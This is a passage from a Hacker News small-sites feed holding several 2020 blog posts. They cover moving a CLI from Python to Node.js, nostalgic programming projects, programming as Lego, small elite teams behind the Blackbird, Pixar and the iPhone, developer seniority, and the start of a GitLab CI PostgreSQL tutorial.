<p>Eventually, I completely rewrote our CLI with NodeJS, <strong>throwing my Python implementation away</strong>. I ended up using the great project <a href="https://github.com/vercel/pkg">pkg</a> for packaging our NodeJS code. We have now been running on Node.js for 6 months, and a team of 5 happy developers.</p>
<h2>Happy Combo: Node.JS + Vue.JS</h2>
<p><strong>Another advantage of moving to Node JS</strong> was having (most of) our stack consist of one programming language - JavaScript.</p>
<p>It’s not uncommon to have multiple microservices, each written in a different language. When the entire codebase is in the same language, it’s easier to teach a team of developers specific topics on JavaScript taking out the hassle of teaching different languages and for different code areas.</p>
<p>This makes things much easier for <strong>engineer onboarding</strong> - at least when it comes to programming languages a new programmer onboarding the team needs to master. Of course they need to be aligned on our best practices for JavaScript and know JavaScript well, but at least most of these best practices will be the same across our repository.</p>
<p>In addition, <strong>when using pkg, private packages</strong> are <a href="https://github.com/vercel/pkg/issues/340">stored as tokenized v8 compilations</a>, so the source code isn’t available (especially not as easy as with <a href="https://programming.vip/docs/decompile-pyinstaller-packaged-exe-installation-package.html">PyInstaller’s compiled files</a>).</p>
<h2>Conclusions of Python-Enthusiast</h2>
<blockquote><div lang="en" dir="ltr"><p>"Is python a good language to start learning?"</p><p>I can't tell you how often I get this question.<br>Yes. Python is great!<br>Javascript is Great!</p><p>All languages are great tools to solve problems.<br>It doesn't matter what you start learning AS LONG as you start.<br>Find your beginning.</p></div>— Danny Thompson (@DThompsonDev) <a href="https://twitter.com/DThompsonDev/status/1299427067810009088?ref_src=twsrc%5Etfw">August 28, 2020</a></blockquote> 
<p><strong>Reading all of this, highlights some major goals</strong> we have as a team on our day-to-day: experiment, learn on the go, and make our collaboration processes more efficient. Our road map already includes a future shift to TypeScript, a subset of JavaScript with its own set of benefits also <a href="https://www.educative.io/edpresso/what-is-typescript?aid=5082902844932096&amp;utm_source=google&amp;utm_medium=cpc&amp;utm_campaign=edpresso-dynamic&amp;gclid=EAIaIQobChMIgPGprKrC6wIVhud3Ch2GyQCdEAAYASAAEgJAU_D_BwE">helpful for team collaboration</a>.</p>
<p><strong>On a personal note, I love Python</strong>. After years of programming in Python it wasn’t an easy choice for me to choose to develop a product in JavaScript. I miss the Context Managers that don’t exist in JS and the libraries I know so well. But also, as a linguist I might add, sometimes, transitioning between programming languages is like speaking a new language fluently but with a strong foreign accent (more about that in another post).</p>
<p><strong>Paying forward some Python love</strong>: I recently created the Python Best Practice Public Playlist, for people who started learning xPython syntax, and are on a mission to learn and improve. To get it, shoot an email to <a href="mailto:info@swimm.io">info@swimm.io</a></p>
<p>...</p>
<p><strong>Omer Rosenbaum</strong>, is Swimm’s Co-Founder and Chief Technology Officer. Cyber training expert and Founder of Checkpoint Security Academy. Author of <a href="https://data.cyber.org.il/networks/networks.pdf">Computer Networks (in Hebrew)</a>. Visit My <a href="https://www.youtube.com/watch?v=79jlgESHzKQ&amp;list=PL9lx0DXCC4BMS7dB7vsrKI5wzFyVIk2Kg">YouTube Channel</a>.</p>
</div></div></div>]]>
            </description>
            <link>https://swimm.io/blog/why-we-chose-node-js-over-python-for-our-product/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24954559</guid>
            <pubDate>Sat, 31 Oct 2020 19:44:29 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Programming can still be magical]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24954551">thread link</a>) | @a7b3fa
<br/>
October 31, 2020 | https://johv.dk/blog/magical-programming.html | <a href="https://web.archive.org/web/*/https://johv.dk/blog/magical-programming.html">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><article lang="en-US">

<p>
Computers used to be fun. Programming felt magical – it gave you the
ability to create something out of nothing. Over the last few decades, personal
computers have become increasingly impersonal, and programming has lost much of
that magic.
</p>
<p>
But some still recognize that programming can be a creative endeavor, undertaken
for its own sake. In fact, there are thriving communities working to create
elegant, empowering tools for the next generation of tinkerers. In this article,
I want to highlight some of my favorite projects that are working to bring magic
back to programming.
</p>
<hr>
<p>
<a href="https://www.lexaloffle.com/pico-8.php" rel="nofollow">PICO-8</a>
is a <i>fantasy console</i> – an emulator for a Commodore 64-era computer
that never existed. You can just boot it up and start typing in commands from
<a href="https://www.lexaloffle.com/pico-8.php?page=manual" rel="nofollow">the manual</a>.
PICO-8 is perfect for people who are new to programming, and its constraints make
it a fun challenge even for experienced programmers.
</p>
<p>
<a href="https://pharo.org/" rel="nofollow">Pharo</a>
is a living descendant of the legendary Smalltalk-80 system. Describing it as a
programming language would be inadequate – it's like a world inside a
computer. Pharo is expansive, yet playing around in it feels cozy. Spending a
few weekends with this environment has enriched my appreciation for what
programming can be.
</p>
<p>
Few things are more satisfying than bootstrapping an entire programming language
from scratch.
<a href="https://github.com/nornagon/jonesforth" rel="nofollow">Jonesforth</a>
is a complete
implementation of the Forth programming language in
<a href="https://github.com/nornagon/jonesforth/blob/master/jonesforth.S" rel="nofollow">a couple thousand lines of thoroughly commented assembly code</a>.
Forth sits somewhere in the space between genius and insanity. It's weird and
beautiful, and well worth tinkering with.
</p>
<p>
If you want to go a level deeper, Andreas Kling is
<a href="https://www.youtube.com/c/AndreasKling/videos" rel="nofollow">documenting the process of building an entire operating system in C++</a>.
His videos about
<a href="http://serenityos.org/" rel="nofollow">SerenityOS</a>
show just how much work goes into building an operating system – but also
demonstrate that such a feat is remarkably achievable.
</p>
<p>
Modern computers are complicated, but the principles behind them don't have to
be.
<a href="https://eater.net/" rel="nofollow">Ben Eater's</a>
video series in which he
<a href="https://www.youtube.com/watch?v=HyznrdDSSGM&amp;list=PLowKtXNTBypGqImE405J2565dvjafglHU" rel="nofollow">builds his own computer on a breadboard</a>
is a must watch, even if you're not planning to follow along yourself. He
explains the process so elegantly that it almost seems obvious.
</p>
<p>
But you don't need an interest in electronics or operating systems to enjoy
programming. Web development has a reputation for being needlessly obtuse, but
at its best, the Web is one of the most amazing technologies we have. It lets
you create something that anyone, anywhere can start using the moment you put it
out there just by clicking a link.
</p>
<p>
<a href="https://glitch.com/" rel="nofollow">Glitch</a>
boils Web development down to its basics. With one button click, you get your own
little server on the web where you can build anything you want. There's no
deployment, source control or build pipelines – just code.
</p>
<p>
And the
<a href="https://neustadt.fr/essays/the-small-web/" rel="nofollow">Small Web</a>
is home to hundreds of little communities, existing outside the big bubble of
commercial social media. If you want your own space on the Web, there's
<a href="https://neocities.org/" rel="nofollow">Neocities</a>,
<a href="http://tilde.club/" rel="nofollow">tilde.club</a>
and
<a href="https://special.fish/" rel="nofollow">Special Fish</a>
to name a few. Why should you have to sell your data just because you want to
connect with people?
</p>
<hr>
<p>
If programming is getting stale, I encourage you to check out some of the
projects on this list. Try to create something unoriginal, useless and
unfinished – and have fun doing it. You don't need a reason to write a
program or build a website. It's okay to create something just because it's
fun to create.
<a href="https://www.robinsloan.com/notes/home-cooked-app/" rel="nofollow">An app can be a home-cooked meal.</a>
Programming can still be magical.
</p>

<p>
Thanks for reading! If you found my work curating this list valuable and
want to show your support, you're welcome to send a small tip to my
<a rel="nofollow" href="https://www.getmonero.org/">Monero</a>
address:
<code>84aWRTVRX8mTLbBbYh3qqZXdxG4GYjiuXVxcAsyvj4FFSprBaH96dxm4DREGybFJraCnLNrXEoMCBZrLcuQk98wwCxnMDFj</code>
</p>





</article></div>]]>
            </description>
            <link>https://johv.dk/blog/magical-programming.html</link>
            <guid isPermaLink="false">hacker-news-small-sites-24954551</guid>
            <pubDate>Sat, 31 Oct 2020 19:43:14 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Programming is like building Lego blocks]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24954449">thread link</a>) | @alanmontgomery
<br/>
October 31, 2020 | https://blog.alanmontgomery.co.uk/programming-is-like-building-lego-blocks | <a href="https://web.archive.org/web/*/https://blog.alanmontgomery.co.uk/programming-is-like-building-lego-blocks">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div id="__next"><div><div><main><article itemscope="" itemtype="http://schema.org/Article"><div><section itemprop="articleBody mainEntityOfPage"><meta itemprop="thumbnailUrl image" content="https://cdn.hashnode.com/res/hashnode/image/upload/v1604172462573/597abudH8.png?w=1600&amp;h=840&amp;fit=crop&amp;crop=entropy&amp;auto=format&amp;q=60"><div><div><div><div><p>Subscribe to <!-- -->my<!-- --> newsletter and never miss <!-- -->my<!-- --> upcoming articles</p></div></div></div><div itemprop="text"><p>This may seem like a weird thing to compare programming or coding to, but it's so true, for a few reasons.</p>

<p>When you have a piece of code, you can stop and continue building upon your solution at any time - you're not forced to finish all of your code at once - you can pause and come back to it at any point - however if you stop at a point when your code isn't complete in working order then it'll obviously be broken / unfinished. The same goes for Lego - you can build something then come back to it and continue however it'll be unfinished if you leave it.</p>

<p>There are so many different ways to build certain solutions - more efficient ways, shorter ways (in terms of lines of code), modern ways, old school or "traditional" ways etc. They all have one thing in common - they all achieve the same end goal. However one solution or method may be better than another due to certain factors like efficiency, speed, performance etc.</p>

<p>Building and developing consistent code ensures the integrity of your website or product in the long term. If you continue to use proven working patterns and techniques then it's going to be future proof. It also keeps your code alot neater and makes it more readable. Looking at the maintainability factor - this means that you can continue to come back to your code and make easy and fast changes to the code without having to touch core functionality. This also applies to if another developer down the line comes on board and tries to maintain your code - the more consistent and maintainable your code is then the easier it's going to be to be picked up by someone else.</p>
<p>All of these points can be applied directly to Lego - and although it is slightly a weird comparison - it definitely does fit together. If you ever need to bring yourself back to basics for some scope or to realign your vision of a project then think of this post. </p>
<blockquote>
<p>Can you build upon the code you're writing? Is your code consistent and maintainable? Have you figured out the best way to write the solution? </p>
</blockquote>
</div></div></section></div><div><div><div><div itemprop="comment" itemscope="" itemtype="https://schema.org/Comment"><div id="ckgy36bmj00hj20s1be0x5od4"><p><a href="https://hashnode.com/@informatimago" data-title="false"><img data-sizes="auto" loading="lazy" data-src="https://cdn.hashnode.com/res/hashnode/image/upload/v1604172908512/c3TpZafmK.jpeg?w=160&amp;h=160&amp;fit=crop&amp;crop=faces&amp;auto=format&amp;q=60" data-width="160" data-height="160" alt="Pascal J. Bourguignon's photo" src="https://cdn.hashnode.com/res/hashnode/image/upload/v1604172908512/c3TpZafmK.jpeg?w=160&amp;h=160&amp;fit=crop&amp;crop=faces&amp;auto=format&amp;q=60"></a></p><div><meta itemprop="dateCreated datePublished" content="2020-10-31T19:36:23.132Z"><p>I would add that over the years, I noticed that people who never played with Lego had some difficulties programming. Before giving computers to your children, give them Lego!</p><div><div><div><div itemprop="comment" itemscope="" itemtype="https://schema.org/Comment" id="ckgy3bv0d00hx20s19dxi3krq"><p><a href="https://hashnode.com/@alanmontgomery" data-title="false"><img data-sizes="auto" loading="lazy" data-src="https://cdn.hashnode.com/res/hashnode/image/upload/v1603800170497/W8nM0qsHB.jpeg?w=160&amp;h=160&amp;fit=crop&amp;crop=faces&amp;auto=format&amp;q=60" data-width="160" data-height="160" alt="Alan Montgomery's photo" src="https://cdn.hashnode.com/res/hashnode/image/upload/v1603800170497/W8nM0qsHB.jpeg?w=160&amp;h=160&amp;fit=crop&amp;crop=faces&amp;auto=format&amp;q=60"></a></p><div><meta itemprop="dateCreated datePublished" content="2020-10-31T19:40:41.535Z"><p>I love that. I totally agree with you. Although it's very very rare these days that children will play with toys or anything like Lego anymore 😭. Most have iPads and the likes by 3 or 4!</p></div></div></div></div></div></div></div></div></div></div></div></article></main></div></div></div></div>]]>
            </description>
            <link>https://blog.alanmontgomery.co.uk/programming-is-like-building-lego-blocks</link>
            <guid isPermaLink="false">hacker-news-small-sites-24954449</guid>
            <pubDate>Sat, 31 Oct 2020 19:28:13 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Blackbird. Pixar. iPhone]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24954441">thread link</a>) | @thesephist
<br/>
October 31, 2020 | https://thesephist.com/posts/best/ | <a href="https://web.archive.org/web/*/https://thesephist.com/posts/best/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><article>
        <p>Outside the cockpit, the air chilled to fifty degrees Fahrenheit below zero.</p>
<p>The reinforced glass panes of the windows ripped through the thin upper atmosphere at such terrifying speed that it was hot to the touch from invisible friction against the winds. Two of the most advanced jet engines in the world roared some 50 feet behind the twin pilot seats, but neither of them could hear it: The SR-71 Blackbird flew at Mach 3.5, slicing through the air 85,000 feet above the ground like chainsaw through jello, racing the vibrations of sound its engines left in its own wake, and winning by miles.</p>
<h2 id="the-blackbird">The Blackbird</h2>
<p>The Blackbird earned its name because of the jet-black paint that covers the entire titanium exterior of the aircraft – a purely utilitarian choice to most effectively dissipate the immense heat generated by sprinting through the air three times faster than sound. It set speed records when it flew from Los Angeles to Washington D.C. in a few minutes over an hour. The same flight takes around five hours in a typical commercial jet airliner. To date, it’s the fastest jet ever flown.</p>
<p><img src="https://thesephist.com/img/blackbird.jpg" alt="SR-71 Blackbird"></p>
<p>The SR-71 Blackbird was built in the late 1950’s by Lockheed’s Skunk Works division for the CIA’s Cold War missions. Skunk Works began as a small, elite group of around 40 aircraft engineers working under the industry veteran Kelly Johnson with little oversight from Lockheed and a <em>carte blanche</em> from upper management. The Blackbird is one of several storied aircrafts built by the Skunk Works team, in a lineup that also includes the famed F-117 and F-22, better known as Nighthawk and Raptor.</p>
<p>Over the course of its history, Skunk Works would move from building to building to design and deliver new innovative aircrafts for Lockheed. Many decades after the Blackbird’s maiden flight, one of Skunk Works' buildings would greet an unwitting pair of business executives: Steve Jobs and Ed Catmull, searching for architectural inspiration for a new building just outside San Francisco that would soon host a budding animation studio Steve had recently acquired, called <em>Pixar</em>.</p>
<h2 id="pixar">Pixar</h2>
<p>When the lightning struck, Pixar – like its then majority owner Jobs – was on an apparent decline. Pixar had been building computer workstations and software designed for creating rich computer graphics, but the business was shrinking, and the company was being shopped around for sale, eventually resulting in Steve Jobs wholly owning Pixar. They were then only a computer company with a fascination for graphics and storytelling.</p>
<p>After rounds of layoffs and consolidation, by 1991, Pixar had just over 40 employees left. The company had already sold off its hardware division long ago, and the small team that remained awaited the company’s probable certain death by writing 3D animation software like <a href="https://renderman.pixar.com/">RenderMan</a>.</p>
<p>Later that year, Pixar struck a deal with Disney for three animated feature films for a meager $26 million. A few years later, the first feature-length film from Pixar, <em>Toy Story</em>, debuted to universal fanfare, grossing over $350 million worldwide. Pixar followed up with <em>A Bug’s Life</em>, <em>Finding Nemo</em>, <em>Monsters, Inc.</em>, and <em>The Incredibles</em> – hit after hit after hit. Pixar’s landmark partnership with Disney saved the company, and propelled Pixar to the animation juggernaut status it enjoys today.</p>
<p>Pixar went public in 1995, just after the record-setting debut of <em>Toy Story</em>, eventually making its owner a newly-minted billionaire. Jobs, an exiled founder of his own company rejuvenated by the success and creative potential of technology at Pixar, returned to Apple a few years later for his final acts.</p>
<h2 id="iphone">iPhone</h2>
<p><em>Project Purple</em> began on a single floor in a building in Cupertino, locked and gated by key cards and codes even tighter than the usual levels of security at Apple. They were doing a phone. But nobody outside of those locked office perimeters would know that for a few years – even the cleaning crew were banned from the floor. To the rest of Apple’s unsuspecting staff, a few noted engineers simply disappeared over time, pulled into a mystery project.</p>
<p>The iPhone really came together in pieces, rather than from the whole. A web browser here, a phone radio there, a multi-touch keyboard here, an old abandoned tablet prototype there. One of the many miracles of the first iPhone is the way these disparate ideas melded together into a concept, then to a debut with an on-stage demo that sucked the air out of the room in 2007, to the best-selling product in the history of products.</p>
<p>But just as remarkable as the influence of the product itself is that the Purple Project was built by a <em>team</em>. Not a company or a division or a business unit, but a small, talented, squad of designers and engineers working tightly together in complete secrecy, competing and collaborating on what would be a history-defining marriage of engineering and design. An elite crew of the best people Apple could find, advised directly by the company’s executives, separate from the rest of the company’s operations. You might even call it a <em>skunkworks</em> project.</p>
<h2 id="just-enough-of-only-the-best">Just enough of only the best</h2>
<p>I find these stories of era-defining teams so fascinating because it goes against the conventional wisdom that larger teams create larger impact. It emanates a refreshingly different message: <em>small teams of very smart people, working tightly together in a trusted group, create the best inventions</em>.</p>
<p>Companies are machines designed to scale. To grow as a business, serve more customers. To serve more customers, build more products. To build more products, find more builders. Naturally, the result is that a company grows with its ambitions, and its ambitions grow with its people.</p>
<p>But the Blackbird, Pixar, and the iPhone were not products of large, sprawling corporate bureaucracies. In fact, they were designed to be the polar opposite: a small, elite group of the most talented people available, working closely with experienced visionaries with a high degree of autonomy and a singular focus.</p>
<p>I think these stories invite a closer look at the way we think about building teams. It asks us to value talent over scale, trust over control, and focus over delegation. It suggests that the way to build great teams is to <strong>find only the best people – the top individuals you’ve worked with – and to gather only just enough of them to realize your ambition</strong>. However you measure “best” – your balance of talent, creativity, persistence, kindness – make sure the team is always empowered to do the right thing. For the project, for the work, for each other.</p>
<p>One of the profound lessons I’ve learned in the last year is that <em>it is the people that always make the difference</em> between ideas that succeed and ideas that fail. The right team, given the wrong ideas, will correct their course and build the right thing. The wrong team, given the right ideas, will stumble over the many obstacles that litter the road to creating something great. It seems that in order to be a great maker of things, whether software or companies or something entirely different, people matter more than anything else. On this challenge, I think there is still much to learn from stories of superlative teams past, from the Blackbird, Pixar, and the iPhone.</p>
<hr>
<p>More than usual, this piece pulls from external reading. If you’re curious about any of these stories of invention, I would highly recommend diving deeper – there are always more insights to be gleaned.</p>
<p>On the SR-71 Blackbird aircraft and its history, check out <a href="https://www.wired.com/2010/09/0901sr-71-blackbird-transatlantic-record/">Wired’s piece on the aircraft</a> and <a href="https://www.cnn.com/style/article/sr-71-blackbird-spy-plane-design/index.html">CNN’s historical overview</a>, as well as <a href="https://en.wikipedia.org/wiki/Skunk_Works#History">the history of Lockheed Skunk Works itself</a>.</p>
<p>On the history of Pixar and Steve Jobs’s tumultuous leadership of the studio, I heavily referenced Brent Schlender and Rick Tetzeli’s excellent <em>Becoming Steve Jobs</em> as well as <a href="https://en.wikipedia.org/wiki/Pixar#Independent_company">other sources on Pixar’s corporate history</a>.</p>
<p>On the history of the iPhone project, I pulled from Ken Kocienda’s <em>Creative Selection</em>, the aforementioned <em>Becoming Steve Jobs</em>, and <a href="https://www.theverge.com/2017/6/13/15782200/one-device-secret-history-iphone-brian-merchant-book-excerpt">an excerpt published on The Verge</a> about other accounts of the original Purple Project team.</p>
<p>Lastly, many of the ideas in this post were inspired by writing and talks by Bryan Cantrill, formerly CTO of Joyent and currently at Oxide Computer Company. Specifically, his talk on <a href="https://www.youtube.com/watch?v=1KeYzjILqDo">building engineering teams</a> and <a href="http://dtrace.org/blogs/bmc/2015/09/03/software-immaculate-fetid-and-grimy/">blog on software engineering</a> were key to my ideas in this post.</p>

        <hr>
        <p>
            If you enjoyed this piece, you might also enjoy
            
            my next post,
            <a href="https://thesephist.com/posts/networking/"><em>On networking</em></a>.
            
        </p>
        <p>
            I share new posts like this on my <a href="https://thesephist.com/#newsletter">newsletter.</a>
            If you liked this post, you should consider joining the list.
        </p>
        <p>Have a comment or response? You can <a href="https://thesephist.com/#contact">email me.</a></p>
    </article></div>]]>
            </description>
            <link>https://thesephist.com/posts/best/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24954441</guid>
            <pubDate>Sat, 31 Oct 2020 19:27:53 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Software Developer Path to Seniority]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24954299">thread link</a>) | @jak_sky
<br/>
October 31, 2020 | https://jakubstransky.com/2020/10/31/developers-path-to-seniority/ | <a href="https://web.archive.org/web/*/https://jakubstransky.com/2020/10/31/developers-path-to-seniority/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
		
<p>What seniority means for a software engineer? Is it familiarity with frameworks, libraries or something different? In this post, I will try to summarise my perspective on how it is changing for me. Got a lot of view during the last three years when I have lead or participated in a decent amount of interviews for engineering roles, including the C-level executives. Let state the obvious: fair and good hiring is super hard. During the hiring process, you try to assess the seniority of the candidate(and other qualities for sure) according to the company career ladder. As a reference, industry-respected and well-known ladder description can be used <a rel="noreferrer noopener" href="https://codingrelic.geekhold.com/2018/08/google-software-engineering-levels-and.html" target="_blank">Google career ladder</a>. If you haven’t had an opportunity to familiarise yourself with it, take the time and do so, it is definitely worth understanding. Google career ladder construction anchored in <a rel="noreferrer noopener" href="https://www.cnbc.com/2019/02/28/what-google-learned-in-its-quest-to-build-the-perfect-team.html" target="_blank">Google perfect team study</a>. This post doesn’t attempt to mimic Google research but rather provide a starting point and raise curiosity. Excellent management is where the resulted outcome of the team is far greater than the pure sum of individual contributions.&nbsp;</p>



<p>Seniority levels are usually a combination of technical “hard” skills and other skills collectively referred to as “soft” skills. Unfortunately, relatively few companies go beyond this level of explanation.&nbsp;</p>



<p>Junior level is characterised by a strong desire to learn new tools, frameworks and techniques. Often connected with black and white view on problems and when solving a task, junior developers can come up with a single possible solution or more with slight modifications. It is nothing wrong to be at that stage, and healthy teams often contain some junior developers as they bring fresh trends and passion to the teams. However, having more than 25% of junior developers in the team is challenging as they require more attention and slows the team down or affect the quality. Be careful with this mix.</p>



<p>Gaining seniority than then goes on a few axes –&nbsp;<em>technical skills,</em>&nbsp;<em>context</em>&nbsp;developer is using during the evaluation of possible solutions and ability to&nbsp;<em>communicate effectively</em>. Junior developer has limited technical skills, and his context is limited to code he is writing and communicates solely in terms of code, requirements or tickets. Context is a vital vehicle for guiding a developer in two remaining axes. As technical skills are growing number of the possible solution raises as well. Context can be divided but not limited to the following scopes:</p>



<p><strong>Codebase</strong> – Limits the knowledge to the current codebase, used technologies and design principles and thinking in those low-level terms. This definition can be confusing as project codebase is involved every time as the ultimate source of truth but what differs is the level of abstraction. Developers are growing by operating bigger codebase and experience on different project codebase.</p>



<p><strong>Development habits and practices</strong> – This area covers topics like where to apply which kind of tests. Where are the areas you can compromise if chasing time, and what are the real costs? Tech debt management. Essential features for long term supportability. Those items can be categorised under some risk management and damage control practices.</p>



<p><strong>System design</strong> – Designing a system for performance, scalability, security and similar system-wide aspects. Defining thread zones and expected failure scenarios. Think in terms of consistency and ability to enforce those policies on the platform level. What can be handled on infrastructure level vs what is necessary to address in the application code?</p>



<p><strong>Different mindset/roles</strong> – Understanding of other functions and associated mindsets of people participating in the development process (system engineers, quality assurance, machine learning engineers, project managers, etc.). What helps the best in this area is to try out the majority of those roles. Getting the role mindset will simplify communication during cross-team communication.</p>



<p><strong>Software development life cycle</strong> – Ability to foresee and expect requirements which might not be implicitly obvious or stated in the desired functionality description. Understanding of product lifecycle stages starting from ideation till end-of-life. An item like supportability, troubleshooting etc. What helps in those aspects is to take the perspective of technical support personnel and think in terms of what-if. How difficult would it be to discover that component/feature X doesn’t work as expected.</p>



<p><strong>Technology overview</strong> – Knowledge of technologies and alternatives gives you lego blocks for building a final solution architecture. This is especially important for the cloud-based product as you are trading a cost for a speed of delivery. Similarly, the same applies to programming languages. Those have specific features, design patterns etc.&nbsp;</p>



<p><strong>Cross disciplines</strong> – This context is pretty similar to `Different mindset roles` with an only difference; it is focused on actual skills necessary in those roles and effects the tools have on team dynamics. Disciplines like development, operation, infrastructure, marketing and similar.&nbsp;</p>



<p><strong>Cross-level and cross-department awareness</strong> – Understanding main objectives, areas of competence and levels of abstractions those people operate on. Unfortunately, even though role titles repeat competencies and responsibilities differs significantly between companies. That is what makes the execution different for each company and is one of the secret sauce of success. Effects are visible in accounting and balance sheets.&nbsp;</p>



<p><strong>Business domain</strong> – Understanding of industry you operate in helps you to drive better value for your customers by combining your technical abilities with domain knowledge.</p>



<p><strong>Business models</strong> – Understanding how the business makes money on the product you build helps you to understand key aspects of the technical solution in terms of desired points of flexibility, scalability and cost management.</p>



<p>Knowledge and experiences in those scopes provide a better context for making decisions in the bigger picture and finding a more strategic solution for given conditions. Helps you to drive communication more effectively as you can think more like your counter-party and understand his point of view. Lastly, you should be able to come up with a plan of delivery iterations with a value-added in each iteration and mitigated risk.&nbsp;</p>



<p>The more senior you get on technical skills and proceed on the career ladder, the more the role start rely on your leadership skills. The vast amount of companies than forces people to manager roles but some (including Google, Facebook, etc.) allows to continue on technical track and label those positions as Principal or Staff Engineers. The role of those engineers is usually to improve the engineering culture and best practices of the teams apart from solving complex engineering tasks.&nbsp;</p>



<p>I neglected at least one aspect in my writing, the effect of personal characteristics and perspectives for particular roles. I am not going into those but instead refer to great <a rel="noreferrer noopener" href="https://www.howtodeal.dev/" target="_blank">Neil blog with people topologies</a></p>



<p>What is your perspective on the “developer’s” seniority? Let me know in the comment section below, or you can reach me on <a href="https://bit.ly/3kgxTe4" target="_blank" rel="noreferrer noopener">Twitter</a>.</p>



<p>Resources I found the best on those topics except those already mentioned in the text:</p>



<p><a rel="noreferrer noopener" href="https://www.amazon.com/Building-Secure-Reliable-Systems-Implementing-ebook/dp/B088Y67XG4" target="_blank">Building Secure and Reliable Systems: Best Practices for Designing, Implementing, and Maintaining Systems</a></p>



<p><a rel="noreferrer noopener" href="https://www.amazon.com/Accelerate-Software-Performing-Technology-Organizations-ebook/dp/B07B9F83WM" target="_blank">Accelerate: The Science of Lean Software and DevOps: Building and Scaling High Performing Technology Organizations</a></p>



<p><a rel="noreferrer noopener" href="https://www.amazon.com/Team-Topologies-Organizing-Business-Technology-ebook/dp/B07NSF94PC/" target="_blank">Team Topologies: Organizing Business and Technology Teams for Fast Flow</a></p>



<p><a rel="noreferrer noopener" href="https://www.amazon.com/Five-Dysfunctions-Team-Leadership-Fable/dp/0787960756" target="_blank">The Five Dysfunctions of a Team</a></p>



<p><a href="https://www.amazon.com/Managing-Humans-Humorous-Software-Engineering/dp/1484221575" target="_blank" rel="noreferrer noopener">Managing Humans</a></p>



<p><a rel="noreferrer noopener" href="https://www.amazon.com/gp/product/1119523966/" target="_blank">The Invincible Company</a></p>



<p><a href="https://www.amazon.com/Value-Proposition-Design-Customers-Strategyzer/dp/1118968050" target="_blank" rel="noreferrer noopener">Value Proposition Design: How to Create Products and Services Customers Want</a></p>



<p><a href="https://www.amazon.com/Business-Model-Navigator-Models-Revolutionise-ebook/dp/B00PFZ9I8A" target="_blank" rel="noreferrer noopener">The Business Model Navigator</a></p>
			
			
						</div></div>]]>
            </description>
            <link>https://jakubstransky.com/2020/10/31/developers-path-to-seniority/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24954299</guid>
            <pubDate>Sat, 31 Oct 2020 19:09:02 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Gitlab: How to use a PostgreSQL database inside your testing pipeline]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24954268">thread link</a>) | @bknasmueller
<br/>
October 31, 2020 | https://knasmueller.net/gitlab-postgresql-testing-pipeline | <a href="https://web.archive.org/web/*/https://knasmueller.net/gitlab-postgresql-testing-pipeline">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div itemprop="articleBody"><p><strong>Many applications are automatically tested on each commit inside a GitLab pipeline. If your application relies on a database such as PostgreSQL, it can be tempting to use an in-memory database such as H2 for tests because it is easier to set up and destroy for each execution of your test suite. While this works for simple applications, it is no longer possible once you rely on vendor-specific SQL features (e.g., usage of column types not available in H2).</strong></p><p><strong>In this article, I will demonstrate how you can easily set up PostgreSQL in your GitLab pipeline for Spring Boot applications and improve the quality of your unit and integration tests.</strong></p><h3>Setting Up PostgreSQL in your .gitlab-ci.yml</h3><p>Gitlab allows the definition of (network accessible) <em>services</em> that are linked to your application containers when the pipeline is executed. Databases are perfect examples of such services. They are defined in the <code>services:</code> section of your <code>.gitlab-ci.yml</code> file:</p><pre data-enlighter-language="generic">services:
  - postgres:13-alpine</pre><figure id="attachment_581" aria-describedby="caption-attachment-581"><a href="https://knasmueller.net/wp-content/uploads/2020/10/Pasted-into-GitLab-Using-a-PostgreSQL-Database-Inside-your-Testing-Pipeline.png"><img loading="lazy" src="https://knasmueller.net/wp-content/uploads/2020/10/Pasted-into-GitLab-Using-a-PostgreSQL-Database-Inside-your-Testing-Pipeline-290x300.png" alt="" width="290" height="300" srcset="https://knasmueller.net/wp-content/uploads/2020/10/Pasted-into-GitLab-Using-a-PostgreSQL-Database-Inside-your-Testing-Pipeline-290x300.png 290w, https://knasmueller.net/wp-content/uploads/2020/10/Pasted-into-GitLab-Using-a-PostgreSQL-Database-Inside-your-Testing-Pipeline-768x794.png 768w, https://knasmueller.net/wp-content/uploads/2020/10/Pasted-into-GitLab-Using-a-PostgreSQL-Database-Inside-your-Testing-Pipeline-450x465.png 450w, https://knasmueller.net/wp-content/uploads/2020/10/Pasted-into-GitLab-Using-a-PostgreSQL-Database-Inside-your-Testing-Pipeline-780x806.png 780w, https://knasmueller.net/wp-content/uploads/2020/10/Pasted-into-GitLab-Using-a-PostgreSQL-Database-Inside-your-Testing-Pipeline.png 833w" sizes="(max-width: 290px) 100vw, 290px" data-old-src="//knasmueller.net/wp-content/plugins/a3-lazy-load/assets/images/lazy_placeholder.gif" data-src="https://knasmueller.net/wp-content/uploads/2020/10/Pasted-into-GitLab-Using-a-PostgreSQL-Database-Inside-your-Testing-Pipeline-290x300.png" data-srcset="https://knasmueller.net/wp-content/uploads/2020/10/Pasted-into-GitLab-Using-a-PostgreSQL-Database-Inside-your-Testing-Pipeline-290x300.png 290w, https://knasmueller.net/wp-content/uploads/2020/10/Pasted-into-GitLab-Using-a-PostgreSQL-Database-Inside-your-Testing-Pipeline-768x794.png 768w, https://knasmueller.net/wp-content/uploads/2020/10/Pasted-into-GitLab-Using-a-PostgreSQL-Database-Inside-your-Testing-Pipeline-450x465.png 450w, 